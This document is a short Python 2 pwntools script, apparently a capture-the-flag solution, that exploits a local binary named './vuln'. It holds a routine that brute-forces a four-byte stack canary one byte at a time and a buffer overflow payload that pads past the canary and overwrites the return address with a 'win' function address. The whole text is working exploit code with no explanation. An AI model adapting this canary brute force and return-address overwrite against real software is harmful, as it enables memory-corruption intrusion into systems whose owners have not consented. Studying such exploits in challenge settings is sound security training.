from pwn import * 

#offset=32

#found canary
def brute_canary():
  canary = ''
  for i in range(1, 5):
    for e in range(256):
      p = process('./vuln')
      p.sendlineafter('> ', str(32+i))
		
      teste = "a"*32 + canary + chr(e)
      print teste
      p.sendafter('Input> ',teste)
      output = p.recvall()
      if 'Stack' not in output:
        print output
        canary += chr(e) 
        break
  return canary


context(terminal=['tmux','new-window'])

#canary = brute_canary()
canary = 'abcd'
win_addr = p32(0x080486eb)


#p = gdb.debug('./vuln')
p= process('./vuln')


p.sendlineafter('> ', '100')

payload = "a"*32
payload += canary
payload += "a"*16
payload += win_addr

p.sendafter('Input> ', payload)

print p.recvall()
